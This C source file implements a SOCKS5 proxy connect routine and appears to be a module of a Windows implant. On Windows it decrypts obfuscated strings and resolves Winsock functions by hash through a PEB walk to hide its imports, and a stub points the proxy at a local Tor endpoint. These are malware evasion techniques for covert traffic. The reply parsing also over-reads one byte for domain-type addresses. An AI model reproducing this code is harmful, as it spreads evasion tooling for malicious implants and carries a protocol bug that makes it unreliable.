#include "socks5.h"
#include "ws2.h"
#include "config.h"

#ifdef ENABLE_SOCKS5

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"
#include "enc_strings.h"
#include "ws2_peb.h"
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#endif

#include <stdlib.h>
#include <string.h>

#define SOCKS5_VER             0x05
#define SOCKS5_CMD_CONNECT     0x01
#define SOCKS5_ATYP_IPV4       0x01
#define SOCKS5_ATYP_DOMAIN     0x03
#define SOCKS5_REP_SUCCESS     0x00
#define SOCKS5_METHOD_NO_AUTH  0x00

#ifdef _WIN32

/* ── PEB-walk API resolution (ws2_32.dll) ──────────────────── */

typedef SOCKET (WSAAPI *psocket)(int, int, int);
typedef int    (WSAAPI *pconnect)(SOCKET, const struct sockaddr *, int);
typedef int    (WSAAPI *psend)(SOCKET, const char *, int, int);
typedef int    (WSAAPI *precv)(SOCKET, char *, int, int);
typedef int    (WSAAPI *pclosesocket)(SOCKET);
typedef int    (WSAAPI *pgetaddrinfo)(const char *, const char *, const struct addrinfo *, struct addrinfo **);
typedef void   (WSAAPI *pfreeaddrinfo)(struct addrinfo *);
typedef unsigned long (WSAAPI *pinet_addr)(const char *);

static struct {
    psocket      psocket;
    pconnect     pconnect;
    psend        psend;
    precv        precv;
    pclosesocket pclosesocket;
    pgetaddrinfo pgetaddrinfo;
    pfreeaddrinfo pfreeaddrinfo;
    pinet_addr   pinet_addr;
    int          ready;
} g_s5_api;

static int s5_ensure_api(void) {
    if (g_s5_api.ready) return 1;

    char dll[32]; enc_decrypt(enc_ws2_32, ENC_WS2_32_LEN, dll);
    void *ws2 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (!ws2) return 0;

    char fn[32];
    enc_decrypt(enc_socket, ENC_SOCKET_LEN, fn);
    g_s5_api.psocket = (psocket)mirage_get_function_by_hash(
        ws2, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_connect, ENC_CONNECT_LEN, fn);
    g_s5_api.pconnect = (pconnect)mirage_get_function_by_hash(
        ws2, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_send, ENC_SEND_LEN, fn);
    g_s5_api.psend = (psend)mirage_get_function_by_hash(
        ws2, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_recv, ENC_RECV_LEN, fn);
    g_s5_api.precv = (precv)mirage_get_function_by_hash(
        ws2, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_closesocket, ENC_CLOSESOCKET_LEN, fn);
    g_s5_api.pclosesocket = (pclosesocket)mirage_get_function_by_hash(
        ws2, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_getaddrinfo, ENC_GETADDRINFO_LEN, fn);
    g_s5_api.pgetaddrinfo = (pgetaddrinfo)mirage_get_function_by_hash(
        ws2, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_freeaddrinfo, ENC_FREEADDRINFO_LEN, fn);
    g_s5_api.pfreeaddrinfo = (pfreeaddrinfo)mirage_get_function_by_hash(
        ws2, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_inet_addr, ENC_INET_ADDR_LEN, fn);
    g_s5_api.pinet_addr = (pinet_addr)mirage_get_function_by_hash(
        ws2, mirage_encrypted_hash_func(fn));

    if (!g_s5_api.psocket || !g_s5_api.pconnect || !g_s5_api.psend ||
        !g_s5_api.precv || !g_s5_api.pclosesocket ||
        !g_s5_api.pgetaddrinfo || !g_s5_api.pfreeaddrinfo || !g_s5_api.pinet_addr)
        return 0;

    g_s5_api.ready = 1;
    return 1;
}

#endif /* _WIN32 */

static int socks5_send_all(SOCKET sock, const void *data, size_t len) {
    const char *ptr = (const char *)data;
    while (len > 0) {
#ifdef _WIN32
        int n = g_s5_api.psend(sock, ptr, (int)len, 0);
#else
        int n = (int)send(sock, ptr, len, 0);
#endif
        if (n <= 0) return -1;
        ptr += n;
        len -= (size_t)n;
    }
    return 0;
}

static int socks5_recv_all(SOCKET sock, void *buf, size_t len) {
    char *ptr = (char *)buf;
    while (len > 0) {
#ifdef _WIN32
        int n = g_s5_api.precv(sock, ptr, (int)len, 0);
#else
        int n = (int)recv(sock, ptr, len, 0);
#endif
        if (n <= 0) return -1;
        ptr += n;
        len -= (size_t)n;
    }
    return 0;
}

static int socks5_connect_host(SOCKET sock, const char *host, uint16_t port) {
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
#ifdef _WIN32
    { const ws2_api_t *wapi = mirage_ws2_api();
      addr.sin_port = wapi ? wapi->phtons(port) : (u_short)(((port >> 8) & 0xFF) | ((port & 0xFF) << 8));
    }
#else
    addr.sin_port = htons(port);
#endif

#ifdef _WIN32
    uint32_t ip = g_s5_api.pinet_addr(host);
#else
    uint32_t ip = inet_addr(host);
#endif
    if (ip == INADDR_NONE) {
        struct addrinfo hints, *res;
        memset(&hints, 0, sizeof(hints));
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;

        char buf[256];
        size_t hlen = strlen(host);
        if (hlen >= sizeof(buf)) hlen = sizeof(buf) - 1;
        memcpy(buf, host, hlen);
        buf[hlen] = '\0';

#ifdef _WIN32
        if (g_s5_api.pgetaddrinfo(buf, NULL, &hints, &res) != 0 || !res) return -1;
#else
        if (getaddrinfo(buf, NULL, &hints, &res) != 0 || !res) return -1;
#endif
        addr.sin_addr = ((struct sockaddr_in *)res->ai_addr)->sin_addr;
#ifdef _WIN32
        g_s5_api.pfreeaddrinfo(res);
#else
        freeaddrinfo(res);
#endif
    } else {
        addr.sin_addr.s_addr = ip;
    }

#ifdef _WIN32
    if (g_s5_api.pconnect(sock, (struct sockaddr *)&addr, sizeof(addr)) != 0) return -1;
#else
    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) != 0) return -1;
#endif
    return 0;
}

int socks5_connect(const char *proxy_host, uint16_t proxy_port,
                   const char *target_host, uint16_t target_port,
                   SOCKET *out_sock) {
    if (!proxy_host || !target_host || !out_sock) return -1;

#ifdef _WIN32
    if (!s5_ensure_api()) return -1;
    if (ws2_init() != WS2_OK) return -1;
    SOCKET sock = g_s5_api.psocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) return -1;
#else
    if (ws2_init() != WS2_OK) return -1;
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;
#endif

    if (socks5_connect_host(sock, proxy_host, proxy_port) != 0) {
#ifdef _WIN32
        g_s5_api.pclosesocket(sock);
#else
        close(sock);
#endif
        return -1;
    }

    unsigned char method_req[] = {SOCKS5_VER, 0x01, SOCKS5_METHOD_NO_AUTH};
    if (socks5_send_all(sock, method_req, sizeof(method_req)) != 0) {
#ifdef _WIN32
        g_s5_api.pclosesocket(sock);
#else
        close(sock);
#endif
        return -1;
    }

    unsigned char method_resp[2];
    if (socks5_recv_all(sock, method_resp, 2) != 0) {
#ifdef _WIN32
        g_s5_api.pclosesocket(sock);
#else
        close(sock);
#endif
        return -1;
    }

    if (method_resp[0] != SOCKS5_VER || method_resp[1] != SOCKS5_METHOD_NO_AUTH) {
#ifdef _WIN32
        g_s5_api.pclosesocket(sock);
#else
        close(sock);
#endif
        return -1;
    }

    /* Build CONNECT request */
    unsigned char req[512];
    size_t rlen = 0;
    req[rlen++] = SOCKS5_VER;
    req[rlen++] = SOCKS5_CMD_CONNECT;
    req[rlen++] = 0x00; /* reserved */

    size_t thost_len = strlen(target_host);
    if (thost_len > 255) {
#ifdef _WIN32
        g_s5_api.pclosesocket(sock);
#else
        close(sock);
#endif
        return -1;
    }

    req[rlen++] = SOCKS5_ATYP_DOMAIN;
    req[rlen++] = (unsigned char)thost_len;
    memcpy(req + rlen, target_host, thost_len);
    rlen += thost_len;
    req[rlen++] = (unsigned char)(target_port >> 8);
    req[rlen++] = (unsigned char)(target_port & 0xFF);

    if (socks5_send_all(sock, req, rlen) != 0) {
#ifdef _WIN32
        g_s5_api.pclosesocket(sock);
#else
        close(sock);
#endif
        return -1;
    }

    /* Read response header (4 bytes minimum) */
    unsigned char resp_hdr[4];
    if (socks5_recv_all(sock, resp_hdr, 4) != 0) {
#ifdef _WIN32
        g_s5_api.pclosesocket(sock);
#else
        close(sock);
#endif
        return -1;
    }

    if (resp_hdr[1] != SOCKS5_REP_SUCCESS) {
#ifdef _WIN32
        g_s5_api.pclosesocket(sock);
#else
        close(sock);
#endif
        return -1;
    }

    /* Read address based on type */
    unsigned char addr_buf[256];
    size_t addr_len = 0;
    switch (resp_hdr[3]) {
    case SOCKS5_ATYP_IPV4:
        addr_len = 4;
        break;
    case SOCKS5_ATYP_DOMAIN:
        if (socks5_recv_all(sock, addr_buf, 1) != 0) {
#ifdef _WIN32
            g_s5_api.pclosesocket(sock);
#else
            close(sock);
#endif
            return -1;
        }
        addr_len = 1 + addr_buf[0];
        break;
    default:
#ifdef _WIN32
        g_s5_api.pclosesocket(sock);
#else
        close(sock);
#endif
        return -1;
    }

    if (addr_len > 0) {
        if (socks5_recv_all(sock, addr_buf, addr_len) != 0) {
#ifdef _WIN32
            g_s5_api.pclosesocket(sock);
#else
            close(sock);
#endif
            return -1;
        }
    }

    unsigned char port_buf[2];
    if (socks5_recv_all(sock, port_buf, 2) != 0) {
#ifdef _WIN32
        g_s5_api.pclosesocket(sock);
#else
        close(sock);
#endif
        return -1;
    }

    *out_sock = sock;
    return 0;
}

const char *socks5_resolve_via_tor(void) {
    return "127.0.0.1";
}

#endif /* ENABLE_SOCKS5 */
